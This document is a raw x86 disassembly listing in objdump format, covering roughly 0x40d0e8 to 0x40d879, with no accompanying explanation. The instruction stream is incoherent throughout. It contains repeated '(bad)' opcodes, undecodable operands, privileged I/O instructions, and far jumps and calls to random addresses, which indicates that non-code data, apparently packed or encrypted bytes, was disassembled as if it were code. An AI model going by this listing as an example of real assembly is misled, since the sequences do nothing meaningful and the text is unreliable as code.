  40d0e8:	retf   
  40d0e9:	adc    DWORD PTR [ebx],eax
  40d0eb:	mov    edx,0x9455b341
  40d0f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0f1:	std    
  40d0f2:	gs in  eax,0xd1
  40d0f5:	or     ah,BYTE PTR [edx-0x7881aad7]
  40d0fb:	aaa    
  40d0fc:	rcr    DWORD PTR [ebx-0x3b],cl
  40d0ff:	lea    esi,[edi]
  40d101:	add    al,0x13
  40d103:	adc    bp,di
  40d106:	nop
  40d107:	(bad)  
  40d109:	lock arpl di,di
  40d10c:	shr    BYTE PTR [esi-0x64],cl
  40d10f:	cmp    bl,BYTE PTR [edx+0x5ca6ec41]
  40d115:	push   ds
  40d116:	and    DWORD PTR [edi+0x7e4eac8b],0xffffffb8
  40d11d:	cmp    BYTE PTR [ebp-0x1a9a31e2],al
  40d123:	lds    edi,FWORD PTR [bx+si-0x791]
  40d128:	mov    DWORD PTR [ecx],edx
  40d12a:	data16 jnp 0x40d0b3
  40d12d:	loop   0x40d112
  40d12f:	scas   eax,DWORD PTR es:[edi]
  40d130:	adc    esi,eax
  40d132:	arpl   cx,bx
  40d134:	cmp    ebx,ecx
  40d136:	mov    bh,ah
  40d138:	adc    dh,BYTE PTR [eax]
  40d13a:	or     edi,DWORD PTR [edx]
  40d13c:	ins    DWORD PTR es:[edi],dx
  40d13d:	ja     0x40d0c4
  40d13f:	inc    edx
  40d140:	mov    esi,0x28e033e
  40d145:	mov    dl,0xdf
  40d147:	aas    
  40d148:	lea    esp,[ecx+esi*8+0x4e7e62bb]
  40d14f:	xor    eax,0x8e496dea
  40d154:	jmp    0x3729:0x651bb45b
  40d15b:	mov    DWORD PTR [ecx+0x3f4e546b],esp
  40d161:	dec    ecx
  40d162:	clc    
  40d163:	xchg   DWORD PTR [eax],ecx
  40d165:	idiv   BYTE PTR [ecx]
  40d167:	mov    ds:0x90201de8,eax
  40d16c:	mov    DWORD PTR [ebp+eax*2+0x7ce63abc],ecx
  40d173:	xchg   edi,eax
  40d174:	push   ss
  40d175:	cmp    eax,0xed7dd940
  40d17a:	add    bh,BYTE PTR [esi+0x2d83519e]
  40d180:	loope  0x40d1b3
  40d182:	and    cl,BYTE PTR [esi]
  40d184:	mov    ch,BYTE PTR [edi+edi*8]
  40d187:	arpl   WORD PTR [ecx],dx
  40d189:	out    0xb4,eax
  40d18b:	xchg   bl,bl
  40d18d:	jne    0x40d1f0
  40d18f:	shl    BYTE PTR [edx],0x41
  40d192:	mov    BYTE PTR [esi],ah
  40d194:	push   cs
  40d195:	adc    BYTE PTR [ecx],cl
  40d197:	cmp    BYTE PTR [eax-0x23f2cf40],bl
  40d19d:	stos   DWORD PTR es:[edi],eax
  40d19e:	xchg   DWORD PTR [ebp-0x48a9aa20],ecx
  40d1a4:	sub    DWORD PTR [edi+0x5620c6b1],edx
  40d1aa:	test   BYTE PTR [ebp-0x61d16dd1],cl
  40d1b0:	inc    esp
  40d1b1:	sbb    bl,al
  40d1b3:	mov    es,WORD PTR [ebp*2+0x775ce3f1]
  40d1ba:	jle    0x40d1a5
  40d1bc:	shl    DWORD PTR [esi-0x1d2c05a5],0x4f
  40d1c3:	lock xchg ebx,eax
  40d1c5:	repz inc ecx
  40d1c7:	ins    DWORD PTR es:[edi],dx
  40d1c8:	icebp  
  40d1c9:	adc    DWORD PTR [eax+0x78600cf],esi
  40d1cf:	into   
  40d1d0:	dec    edx
  40d1d1:	cld    
  40d1d2:	test   DWORD PTR [esi],ebx
  40d1d4:	xchg   ch,cl
  40d1d6:	mov    ds:0xc803fea6,eax
  40d1db:	cwde   
  40d1dc:	call   0xf2f4a59f
  40d1e1:	dec    esi
  40d1e2:	mov    dh,0x3d
  40d1e4:	mov    ds:0xaaa883a,al
  40d1e9:	jp     0x40d200
  40d1eb:	ss enter 0xa59c,0x63
  40d1f0:	pusha  
  40d1f1:	imul   ebx,DWORD PTR [edx-0x1a],0x29
  40d1f5:	push   ds
  40d1f6:	(bad)  
  40d1f7:	mov    cl,0xd9
  40d1f9:	add    DWORD PTR [ebp+0x2f],edi
  40d1fc:	icebp  
  40d1fd:	cmp    ah,bh
  40d1ff:	xchg   ebx,eax
  40d200:	mov    edx,0x7b3f977a
  40d205:	fisub  WORD PTR [ecx+0x34f5d89b]
  40d20b:	xchg   esi,eax
  40d20c:	and    al,0xab
  40d20e:	push   0xa5f11d73
  40d213:	ja     0x40d1af
  40d215:	lods   al,BYTE PTR ds:[esi]
  40d216:	cld    
  40d217:	mov    al,ds:0x78c81dbd
  40d21c:	inc    eax
  40d21d:	pop    esi
  40d21e:	sar    DWORD PTR [edx],0xc1
  40d221:	fdivr  QWORD PTR [edx-0x72]
  40d224:	mov    ?,WORD PTR [ebp+0x4f]
  40d227:	pop    es
  40d228:	mov    esi,0xd2217068
  40d22d:	mov    ebx,0xc0c7a3cf
  40d232:	rcr    DWORD PTR [edi-0xa],0x1e
  40d236:	add    ch,dh
  40d238:	mov    ecx,0x77201772
  40d23d:	jnp    0x40d29b
  40d23f:	cmc    
  40d240:	cmp    edx,DWORD PTR [ecx-0x62]
  40d243:	or     DWORD PTR [edi+ecx*4-0x30422224],ebp
  40d24a:	mov    dh,0xee
  40d24c:	mov    cl,0xd6
  40d24e:	sbb    al,0x8d
  40d250:	ret    
  40d251:	mov    esp,DWORD PTR [ebx]
  40d253:	ret    
  40d254:	fdiv   QWORD PTR [ecx]
  40d256:	(bad)  
  40d258:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d259:	push   0xffffff88
  40d25b:	(bad)
  40d25f:	fmul   QWORD PTR [eax]
  40d261:	mov    esp,0x1ef32653
  40d266:	jb     0x40d220
  40d268:	inc    edx
  40d269:	cmp    ah,BYTE PTR [ecx-0x54]
  40d26c:	fild   QWORD PTR [ecx-0x2f]
  40d26f:	fcmovbe st,st(2)
  40d271:	push   ss
  40d272:	jae    0x40d2a4
  40d274:	shl    BYTE PTR [eax+0x59],1
  40d277:	and    BYTE PTR [esi+0x25],0x54
  40d27b:	sti    
  40d27c:	push   edx
  40d27d:	fstp   TBYTE PTR [edx+0x59]
  40d280:	sbb    ebp,DWORD PTR [ebx+0x21]
  40d283:	pop    edi
  40d284:	and    eax,0x22b38588
  40d289:	rcr    BYTE PTR [eax+ecx*1-0x7211ef64],1
  40d290:	ja     0x40d23e
  40d292:	loop   0x40d252
  40d294:	mov    al,ds:0x4dd6a022
  40d299:	aas    
  40d29a:	test   DWORD PTR [edx-0x3a],ecx
  40d29d:	stc    
  40d29e:	jmp    0x748e:0x45bf5ecc
  40d2a5:	cmp    DWORD PTR [edx-0x58f6a962],esi
  40d2ab:	enter  0x4ad2,0x7e
  40d2af:	push   esi
  40d2b0:	inc    esp
  40d2b1:	ss jl  0x40d309
  40d2b4:	dec    eax
  40d2b5:	jmp    0x1d72:0x11f7ea4f
  40d2bc:	jmp    0x85c1:0xe56a9be6
  40d2c3:	in     al,dx
  40d2c4:	cmp    esp,DWORD PTR [ecx]
  40d2c6:	out    dx,al
  40d2c7:	daa    
  40d2c8:	test   DWORD PTR [ecx+0x76],esi
  40d2cb:	push   ds
  40d2cc:	mov    ebx,0x7264c611
  40d2d1:	lahf   
  40d2d2:	fstp   TBYTE PTR [eax+0x1485e1be]
  40d2d8:	add    DWORD PTR [ebx+0x74],ebx
  40d2db:	fstp   DWORD PTR [ecx-0x3]
  40d2de:	push   ebp
  40d2df:	mov    cs,WORD PTR [edi+0x29]
  40d2e2:	fldenv ds:0x371e26d6
  40d2e8:	shr    BYTE PTR [ebp+ebx*8-0x43],cl
  40d2ec:	adc    cl,ah
  40d2ee:	nop
  40d2ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2f0:	xchg   esi,eax
  40d2f1:	and    eax,0x1122fef8
  40d2f6:	ds adc ch,ch
  40d2f9:	cwde   
  40d2fa:	(bad)  
  40d2fb:	push   esi
  40d2fc:	add    DWORD PTR [ecx],esi
  40d2fe:	test   DWORD PTR [ebp-0x68],edi
  40d301:	iret   
  40d302:	xchg   ecx,eax
  40d303:	in     eax,0xf3
  40d305:	hlt    
  40d306:	jno    0x40d36d
  40d308:	jle    0x40d328
  40d30a:	mov    bl,0x3f
  40d30c:	sub    al,0x3a
  40d30e:	inc    ebx
  40d30f:	xchg   esp,eax
  40d310:	cmp    BYTE PTR [edi-0x77abd57b],ah
  40d316:	cld    
  40d317:	das    
  40d318:	pop    ebp
  40d319:	ins    BYTE PTR es:[edi],dx
  40d31a:	js     0x40d2ab
  40d31c:	jmp    0x40d338
  40d31e:	xchg   esi,ecx
  40d320:	lods   al,BYTE PTR ds:[esi]
  40d321:	iret   
  40d322:	dec    ebp
  40d323:	or     DWORD PTR [eax],esi
  40d325:	add    eax,DWORD PTR [esi+0x32b2e5d3]
  40d32b:	push   ebx
  40d32c:	push   edx
  40d32d:	sub    DWORD PTR [ebp-0x6ce31c2b],esp
  40d333:	add    al,0xe8
  40d335:	sub    eax,0xb549e3a3
  40d33a:	push   0x5a6c5a34
  40d33f:	jae    0x40d31c
  40d341:	push   ebx
  40d342:	inc    esp
  40d343:	xchg   esp,eax
  40d344:	pop    ebx
  40d345:	xchg   esp,eax
  40d346:	and    edi,esi
  40d348:	bound  edi,QWORD PTR [ebx+0x3fddd745]
  40d34e:	sub    cl,BYTE PTR [ebp-0x1b74fcf0]
  40d354:	xchg   edx,eax
  40d355:	fst    DWORD PTR [ecx]
  40d357:	out    dx,al
  40d358:	(bad)  
  40d359:	mov    DWORD PTR [eax+eax*2+0x68776f19],eax
  40d360:	adc    dh,BYTE PTR [edx-0x16]
  40d363:	xor    BYTE PTR [esi],bh
  40d365:	adc    DWORD PTR [edi],eax
  40d367:	std    
  40d368:	repz and bh,BYTE PTR [edi]
  40d36b:	xchg   ecx,eax
  40d36c:	sbb    esi,0xffffff85
  40d36f:	in     al,0xc6
  40d371:	call   0xbfd554ee
  40d376:	sub    dl,BYTE PTR [ebp-0x417cac29]
  40d37c:	push   edx
  40d37d:	iret   
  40d37e:	dec    esi
  40d37f:	mov    bh,0x69
  40d381:	mov    DWORD PTR gs:0x3ba04bd,edx
  40d388:	shr    dh,cl
  40d38a:	add    ebp,DWORD PTR [eax]
  40d38c:	add    dl,BYTE PTR [esi-0x74]
  40d38f:	scas   eax,DWORD PTR es:[edi]
  40d390:	mov    ds:0xd8f485cd,eax
  40d395:	iret   
  40d396:	fimul  WORD PTR [eax+0x6f8ece0b]
  40d39c:	xchg   esp,eax
  40d39d:	nop
  40d39e:	mov    edx,0xd12eaa8f
  40d3a3:	test   DWORD PTR es:[esi],edx
  40d3a6:	(bad)  
  40d3a7:	xchg   ebx,eax
  40d3a8:	iret   
  40d3a9:	sub    BYTE PTR [ecx],bh
  40d3ab:	sahf   
  40d3ac:	into   
  40d3ad:	aaa    
  40d3ae:	lods   eax,DWORD PTR ds:[esi]
  40d3af:	pop    ebp
  40d3b0:	mov    ebx,0xb7368aef
  40d3b5:	in     al,dx
  40d3b6:	(bad)  
  40d3b8:	data16 fisub WORD PTR [eax-0x2a]
  40d3bc:	arpl   WORD PTR [edx+0x7e],bp
  40d3bf:	test   eax,0xbc05c126
  40d3c4:	out    dx,al
  40d3c5:	sbb    ecx,DWORD PTR [edi-0x2b]
  40d3c8:	xlat   BYTE PTR ds:[ebx]
  40d3c9:	xlat   BYTE PTR ds:[ebx]
  40d3ca:	rcl    BYTE PTR [esi-0x4d2adb2e],1
  40d3d0:	and    ah,bh
  40d3d2:	jle    0x40d3db
  40d3d4:	jp     0x40d450
  40d3d6:	(bad)  
  40d3d7:	cwde   
  40d3d8:	call   0xb293b622
  40d3dd:	jo     0x40d3b4
  40d3df:	loop   0x40d37d
  40d3e1:	jmp    0x61c1076b
  40d3e6:	pop    esp
  40d3e7:	pop    edi
  40d3e8:	pop    esp
  40d3e9:	std    
  40d3ea:	out    dx,eax
  40d3eb:	mov    bh,BYTE PTR [eax-0x5f]
  40d3ee:	(bad)  
  40d3ef:	adc    esi,esi
  40d3f1:	ja     0x40d3d7
  40d3f3:	push   0x59d5366a
  40d3f8:	shr    BYTE PTR [esi],cl
  40d3fa:	cs fs xchg edx,eax
  40d3fd:	jbe    0x40d385
  40d3ff:	mov    ebx,0xcfc11448
  40d404:	in     al,dx
  40d405:	push   esi
  40d406:	inc    esp
  40d407:	out    dx,eax
  40d408:	mov    cl,ch
  40d40a:	push   edx
  40d40b:	xlat   BYTE PTR ds:[ebx]
  40d40c:	ror    DWORD PTR [edi+0xc21ec69],cl
  40d412:	inc    edi
  40d413:	xor    eax,0x8eca02f2
  40d418:	push   eax
  40d419:	push   0xffffffa5
  40d41b:	aad    0x14
  40d41d:	mov    ds:0xcac7bad5,al
  40d422:	xchg   esp,eax
  40d423:	lods   al,BYTE PTR ds:[esi]
  40d424:	ror    al,cl
  40d426:	xchg   ecx,eax
  40d427:	rcr    BYTE PTR ds:[edx],1
  40d42a:	push   esi
  40d42b:	mov    dh,BYTE PTR [ecx]
  40d42d:	xchg   DWORD PTR [ebx+0x2dc7e34e],ebx
  40d433:	jmp    0x6adda52
  40d438:	rcl    bl,1
  40d43a:	xchg   esi,eax
  40d43b:	repz inc edi
  40d43d:	xchg   ecx,eax
  40d43e:	je     0x40d466
  40d440:	mov    esp,0x8aba4a96
  40d445:	call   0xb193:0xe4929788
  40d44c:	(bad)  
  40d44d:	popa   
  40d44e:	out    0x7b,eax
  40d450:	pop    ss
  40d451:	sub    al,BYTE PTR [ebp+0x79e710e7]
  40d457:	xchg   esp,eax
  40d458:	in     eax,dx
  40d459:	xchg   ebx,eax
  40d45a:	sub    al,0x9f
  40d45c:	mov    WORD PTR [esi+0x2],?
  40d45f:	fidiv  WORD PTR [ebx+0x11fb86b1]
  40d465:	imul   edi,DWORD PTR [edx-0x74],0x57254cd2
  40d46c:	test   eax,0xfcbbe6db
  40d471:	daa    
  40d472:	cmp    dl,BYTE PTR [ebx-0x53]
  40d475:	icebp  
  40d476:	inc    edi
  40d477:	dec    ebp
  40d478:	jo     0x40d4b1
  40d47a:	jge    0x40d474
  40d47c:	fs pop ebx
  40d47e:	test   BYTE PTR [esi],dl
  40d480:	jle    0x40d440
  40d482:	sbb    esi,esi
  40d484:	(bad)  
  40d485:	(bad)  
  40d486:	lahf   
  40d487:	loop   0x40d4f0
  40d489:	pop    ds
  40d48a:	mov    ecx,0xac930d67
  40d48f:	mov    ebp,0x20d462f
  40d494:	fmul   QWORD PTR [ecx-0x44531902]
  40d49a:	mov    DWORD PTR [edx+0x7ac9e47],edx
  40d4a0:	cli    
  40d4a1:	(bad)  
  40d4a2:	stc    
  40d4a3:	mov    fs,ebx
  40d4a5:	popa   
  40d4a6:	pop    es
  40d4a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4a8:	dec    esp
  40d4a9:	xor    al,0xe0
  40d4ab:	adc    edx,0x19ad8e21
  40d4b1:	in     al,dx
  40d4b2:	imul   ebp,ecx,0x8ef1ee78
  40d4b8:	cdq    
  40d4b9:	fistp  QWORD PTR [esi+0x352b1bd7]
  40d4bf:	test   dl,dl
  40d4c1:	add    ch,BYTE PTR [ebp+eiz*4-0x2ad67e32]
  40d4c8:	pop    es
  40d4c9:	adc    DWORD PTR [ebp-0x3e],ecx
  40d4cc:	dec    esi
  40d4cd:	push   esp
  40d4ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4cf:	std    
  40d4d0:	sub    eax,0xcad385c6
  40d4d5:	std    
  40d4d6:	push   esi
  40d4d7:	call   0x974abd7e
  40d4dc:	cli    
  40d4dd:	or     DWORD PTR [eax],esi
  40d4df:	repnz stos DWORD PTR es:[edi],eax
  40d4e1:	push   ecx
  40d4e2:	xchg   edi,eax
  40d4e3:	cmp    esi,DWORD PTR [edx]
  40d4e5:	xor    al,BYTE PTR [ebp-0x2d8af251]
  40d4eb:	outs   dx,DWORD PTR ds:[esi]
  40d4ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4ed:	jg     0x40d4e5
  40d4ef:	mov    fs,WORD PTR [edx-0xefef47a]
  40d4f5:	and    BYTE PTR [ecx+0x74c0d355],0x1f
  40d4fc:	out    0x98,al
  40d4fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4ff:	dec    esi
  40d500:	mov    cl,bh
  40d502:	inc    ebx
  40d503:	mov    ds,eax
  40d505:	out    dx,eax
  40d506:	in     al,dx
  40d507:	jb     0x40d49b
  40d509:	adc    al,0x76
  40d50b:	rcl    edx,cl
  40d50d:	fld    DWORD PTR [edi+0x7b92586f]
  40d513:	jl     0x40d4b7
  40d515:	xor    eax,0x2776ef20
  40d51a:	test   DWORD PTR [eax],ebx
  40d51c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d51d:	aas    
  40d51e:	cmp    eax,0x8b1815e5
  40d523:	jno    0x40d4e6
  40d525:	dec    ebx
  40d526:	jno    0x40d524
  40d528:	jne    0x40d5a8
  40d52a:	or     edi,DWORD PTR [edx]
  40d52c:	push   ss
  40d52d:	shl    DWORD PTR [ebp+ebp*1+0x3b],0x10
  40d532:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d533:	je     0x40d55a
  40d535:	addr16 mov edx,0xfdf3aa4f
  40d53b:	xchg   edx,eax
  40d53c:	shr    BYTE PTR [eax],cl
  40d53e:	and    eax,0x32d71aef
  40d543:	loop   0x40d4cc
  40d545:	cmp    DWORD PTR [esi+ecx*8],ebx
  40d548:	push   edx
  40d549:	loop   0x40d4d9
  40d54b:	pusha  
  40d54c:	xchg   ecx,eax
  40d54d:	adc    BYTE PTR gs:[edi],al
  40d550:	dec    edx
  40d551:	mov    es,WORD PTR [ebp-0x240a3c56]
  40d557:	xchg   ecx,eax
  40d558:	ja     0x40d545
  40d55a:	jle    0x3301388d
  40d560:	mov    ah,0x30
  40d562:	push   esi
  40d563:	rcl    dl,1
  40d565:	push   ebp
  40d566:	add    BYTE PTR [eax+0x51c98f10],dl
  40d56c:	cwde   
  40d56d:	adc    BYTE PTR [esi],dh
  40d56f:	sub    eax,DWORD PTR [ebp+0x6a429cb6]
  40d575:	xchg   ebx,eax
  40d576:	add    esi,DWORD PTR [ecx+0x7ebc2fd2]
  40d57c:	xor    edx,ebx
  40d57e:	icebp  
  40d57f:	test   bl,al
  40d581:	adc    esi,ecx
  40d583:	stos   DWORD PTR es:[edi],eax
  40d584:	ficom  DWORD PTR [edi+0x40]
  40d587:	dec    edx
  40d588:	adc    ch,dl
  40d58a:	test   ebp,ebx
  40d58c:	into   
  40d58d:	adc    eax,0x4726c37c
  40d592:	inc    edx
  40d593:	mov    ?,eax
  40d595:	xchg   edi,eax
  40d596:	mov    ch,0x85
  40d598:	sti    
  40d599:	sbb    eax,0xf0e6f75f
  40d59e:	xchg   ecx,eax
  40d59f:	push   cs
  40d5a0:	(bad)  
  40d5a1:	rcl    bl,1
  40d5a3:	rcr    edi,0x15
  40d5a6:	bound  ecx,QWORD PTR [esi+0x14f5904c]
  40d5ac:	fstp   DWORD PTR [ecx]
  40d5ae:	imul   edx,eax,0x99003fd2
  40d5b4:	jnp    0x40d606
  40d5b6:	mov    DWORD PTR [edi-0x65],esi
  40d5b9:	adc    eax,edi
  40d5bb:	mov    ebp,0x71dcc99d
  40d5c0:	inc    ebp
  40d5c1:	xchg   BYTE PTR [ebp-0x4b6dbf25],al
  40d5c7:	clc    
  40d5c8:	fnstcw WORD PTR [ecx+ebp*4-0x72]
  40d5cc:	(bad)  
  40d5cd:	and    BYTE PTR [ecx-0xa84bd0a],bl
  40d5d3:	xor    edx,edx
  40d5d5:	loope  0x40d57d
  40d5d7:	mov    eax,0x74173e92
  40d5dc:	push   ecx
  40d5dd:	push   ds
  40d5de:	mov    al,0xa1
  40d5e0:	mov    ah,0x1f
  40d5e2:	sbb    edi,DWORD PTR [eax]
  40d5e4:	popa   
  40d5e5:	mov    ebx,0x19ce37ff
  40d5ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5eb:	scas   al,BYTE PTR es:[edi]
  40d5ec:	int    0x3
  40d5ee:	sbb    al,0xf8
  40d5f0:	rcl    DWORD PTR [ecx],0xb
  40d5f3:	imul   esi,DWORD PTR ds:0x33432ed0,0xd16f6040
  40d5fd:	dec    ecx
  40d5fe:	out    dx,al
  40d5ff:	push   cs
  40d600:	test   BYTE PTR [ecx+0x48],dl
  40d603:	pop    esp
  40d604:	push   ds
  40d605:	push   edx
  40d606:	mov    ch,0x8e
  40d608:	push   esi
  40d609:	(bad)  
  40d60a:	cli    
  40d60b:	(bad)  
  40d60c:	adc    eax,0xe5942da8
  40d611:	js     0x40d612
  40d613:	or     eax,0x16da7119
  40d618:	std    
  40d619:	xchg   ecx,eax
  40d61a:	inc    ebp
  40d61b:	shl    DWORD PTR [esi+0x17],cl
  40d61e:	cmp    eax,0x8caef48
  40d623:	sbb    al,0x46
  40d625:	sar    DWORD PTR [ebp-0x7a5fa907],1
  40d62b:	retf   
  40d62c:	popf   
  40d62d:	sbb    eax,0x64f426db
  40d632:	xor    cl,BYTE PTR [ebp+0x10f9e096]
  40d638:	jns    0x40d68e
  40d63a:	outs   dx,BYTE PTR ds:[esi]
  40d63b:	clc    
  40d63c:	rcl    BYTE PTR [ecx+0x749453cb],cl
  40d642:	ds pop eax
  40d644:	inc    esp
  40d645:	push   ds
  40d646:	dec    BYTE PTR [ebp+0x0]
  40d649:	loope  0x40d69c
  40d64b:	mov    eax,0x468f87cf
  40d650:	ja     0x40d5f0
  40d652:	xchg   BYTE PTR [eax],bh
  40d654:	fwait
  40d655:	push   ss
  40d656:	sbb    al,BYTE PTR [esi]
  40d658:	or     edx,DWORD PTR [ecx]
  40d65a:	mov    ch,0x90
  40d65c:	mov    esp,0x5de38d0b
  40d661:	sub    al,BYTE PTR [ebp+0x6001e4ac]
  40d667:	fs stos BYTE PTR es:[edi],al
  40d669:	mov    ebx,ds
  40d66b:	(bad)  
  40d66c:	push   eax
  40d66d:	jnp    0x40d639
  40d66f:	dec    esi
  40d670:	or     DWORD PTR [esi+edi*2-0x7d424e24],esp
  40d677:	std    
  40d678:	dec    edx
  40d679:	cs popa 
  40d67b:	mov    ss,WORD PTR [edi-0xdb4e6a2]
  40d681:	adc    eax,ecx
  40d683:	push   ebp
  40d684:	popf   
  40d685:	ss test eax,0x85dc65f0
  40d68b:	std    
  40d68c:	xchg   DWORD PTR [ebp+0x5c],esi
  40d68f:	sbb    DWORD PTR [ecx-0x4372d3ce],ebp
  40d695:	test   DWORD PTR [edx+0x51982d66],ebp
  40d69b:	push   ss
  40d69c:	rcr    DWORD PTR [ecx+0x4c],cl
  40d69f:	mov    cl,0x0
  40d6a1:	mov    edi,DWORD PTR [edx-0x1a7e6858]
  40d6a7:	js     0x40d6cb
  40d6a9:	adc    DWORD PTR [eax+ecx*1],edx
  40d6ac:	and    al,0xf1
  40d6ae:	sbb    esp,DWORD PTR [ecx-0x1c]
  40d6b1:	cmp    al,0xe9
  40d6b3:	mov    al,0x74
  40d6b5:	faddp  st(5),st
  40d6b7:	jae    0x40d72f
  40d6b9:	loopne 0x40d69f
  40d6bb:	mov    dh,0xab
  40d6bd:	adc    ecx,esp
  40d6bf:	xchg   DWORD PTR [edi+0xadfaa32],esi
  40d6c5:	fwait
  40d6c6:	test   DWORD PTR [ebp+0x35],edx
  40d6c9:	mov    DWORD PTR [ebp-0x12fff71],edx
  40d6cf:	mov    fs,WORD PTR [eax+eiz*8]
  40d6d2:	mov    al,0xb3
  40d6d4:	mov    edi,esi
  40d6d6:	shl    BYTE PTR [eax-0x25],0x2a
  40d6da:	mov    ecx,0x9a9adc19
  40d6df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6e0:	push   edx
  40d6e1:	data16 or dh,dh
  40d6e4:	jno    0x40d704
  40d6e6:	and    DWORD PTR [ebp-0x3d789ee9],esi
  40d6ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6ed:	mov    bh,0xef
  40d6ef:	retf   0x2319
  40d6f2:	imul   ebx,ebp,0x20103092
  40d6f8:	pop    ebx
  40d6f9:	mov    gs:0xc575218e,al
  40d6ff:	mov    esi,DWORD PTR [edi-0x14]
  40d702:	cmp    eax,edi
  40d704:	or     bh,BYTE PTR [edx-0x772471b6]
  40d70a:	cli    
  40d70b:	xor    al,0xe3
  40d70d:	jmp    0x40d69a
  40d70f:	call   0x8894e90e
  40d714:	imul   DWORD PTR [ecx+0x14549287]
  40d71a:	adc    BYTE PTR [eax+0x7c],0xa1
  40d71e:	adc    BYTE PTR [edi],dl
  40d720:	lds    ebx,FWORD PTR [ebp+eiz*1+0x148e6e22]
  40d727:	lock inc esi
  40d729:	push   ds
  40d72a:	mov    al,0xe8
  40d72c:	adc    cl,BYTE PTR [ebp+0x29]
  40d72f:	adc    al,0x1b
  40d731:	data16 std 
  40d733:	inc    edx
  40d734:	mov    bh,0x36
  40d736:	add    ecx,DWORD PTR [esi-0x21eb064b]
  40d73c:	or     eax,0x6e16e111
  40d741:	pop    edi
  40d742:	mov    ecx,0x85dcf7fe
  40d747:	sbb    al,0x5e
  40d749:	or     eax,0x664b6b68
  40d74e:	or     eax,0x86aef8e
  40d753:	(bad)  
  40d754:	cs inc edx
  40d756:	leave  
  40d757:	hlt    
  40d758:	rcl    ebp,1
  40d75a:	inc    DWORD PTR [esi]
  40d75c:	jns    0x40d7db
  40d75e:	mov    esi,0xb87277
  40d763:	inc    ecx
  40d764:	mov    WORD PTR [ecx],ss
  40d766:	in     al,dx
  40d767:	adc    al,0x89
  40d769:	ds and eax,0x85e42be7
  40d76f:	jo     0x40d6fb
  40d771:	mov    ecx,0xb271e0f8
  40d776:	inc    ecx
  40d777:	xchg   ebx,eax
  40d778:	test   eax,0x1ac55d0
  40d77d:	lea    edi,[ebp-0x7a6600f5]
  40d783:	ja     0x40d73c
  40d785:	(bad)  
  40d786:	fisubr DWORD PTR [ebx+ebx*8-0x55]
  40d78a:	cmp    eax,0x33a08f90
  40d78f:	push   edi
  40d790:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d791:	adc    BYTE PTR [esi+0x4dc12b02],dh
  40d797:	loope  0x40d786
  40d799:	loop   0x40d720
  40d79b:	mov    bl,0x41
  40d79d:	jmp    0xa6038c2a
  40d7a2:	mov    cl,0x26
  40d7a4:	adc    DWORD PTR [ecx],0x32
  40d7a7:	jo     0x40d7e9
  40d7a9:	cmp    BYTE PTR [esi-0x58],0xb0
  40d7ad:	cdq    
  40d7ae:	test   BYTE PTR [edx-0x8],bh
  40d7b1:	add    BYTE PTR [ecx+0x23ca3276],cl
  40d7b7:	sub    eax,0x9b6bed5c
  40d7bc:	adc    eax,ecx
  40d7be:	stc    
  40d7bf:	mov    eax,ds:0x5be33c52
  40d7c4:	or     eax,0xcb6a859c
  40d7c9:	xchg   esp,eax
  40d7ca:	ins    DWORD PTR es:[edi],dx
  40d7cb:	jnp    0x40d80e
  40d7cd:	stc    
  40d7ce:	or     ecx,DWORD PTR [esi+0x23f417b6]
  40d7d4:	sub    eax,0xd024a4dd
  40d7d9:	(bad)  [ebx+0x7511bbf]
  40d7df:	sub    ebx,edx
  40d7e1:	mov    esp,ebp
  40d7e3:	mov    ds,WORD PTR [edx-0x7e2c48d0]
  40d7e9:	push   ecx
  40d7ea:	dec    eax
  40d7eb:	sub    al,0xb4
  40d7ed:	enter  0x885,0x4f
  40d7f1:	pop    edi
  40d7f2:	leave  
  40d7f3:	repz dec ebx
  40d7f5:	(bad)  
  40d7f6:	push   edx
  40d7f7:	mov    ?,esi
  40d7f9:	and    bl,ch
  40d7fb:	inc    ebx
  40d7fc:	mov    esi,0xd2ec06e5
  40d801:	popf   
  40d802:	dec    eax
  40d803:	dec    esp
  40d804:	and    al,bl
  40d806:	mov    ch,0x8
  40d808:	push   edx
  40d809:	and    dl,BYTE PTR [edi+ecx*1+0x52]
  40d80d:	xor    eax,0x472779e9
  40d812:	out    0xa5,eax
  40d814:	test   eax,0xccd02398
  40d819:	jmp    0x40d7d1
  40d81b:	sub    BYTE PTR [edx-0x28],dl
  40d81e:	jne    0x40d82e
  40d820:	add    DWORD PTR [ecx],edx
  40d822:	in     al,dx
  40d823:	and    al,0xbd
  40d825:	jne    0x40d80d
  40d827:	pop    ebp
  40d828:	shr    BYTE PTR [esp+eax*4-0x66],1
  40d82c:	mov    DWORD PTR [edx-0x44],ebp
  40d82f:	jae    0x40d844
  40d831:	xchg   ebp,eax
  40d832:	mov    ds:0xb09278e,eax
  40d837:	mov    ebx,0xbf16b652
  40d83c:	sar    BYTE PTR [esi+0x37],cl
  40d83f:	(bad)  [ebp-0x56]
  40d842:	adc    eax,0x791e6d06
  40d847:	sbb    BYTE PTR [eax],ah
  40d849:	mov    eax,0xe32dff02
  40d84e:	test   DWORD PTR [esi-0x14],edi
  40d851:	ins    BYTE PTR es:[edi],dx
  40d852:	pop    ebx
  40d853:	sub    al,BYTE PTR [eax+0x1]
  40d856:	sbb    DWORD PTR [ecx-0x34],ebp
  40d859:	push   ss
  40d85a:	xchg   ecx,eax
  40d85b:	int    0xc1
  40d85d:	xor    eax,0x767a2b85
  40d862:	cmp    edx,DWORD PTR [eax]
  40d864:	out    0xd8,eax
  40d866:	sbb    cl,BYTE PTR [esi]
  40d868:	stc    
  40d869:	rol    DWORD PTR [ebx+0x49],1
  40d86c:	jo     0x40d8e1
  40d86e:	jle    0x40d802
  40d870:	xor    esi,ebp
  40d872:	jmp    0x49d29761
  40d877:	outs   dx,DWORD PTR ds:[esi]
  40d878:	stos   BYTE PTR es:[edi],al
  40d879:	sub    eax,edx
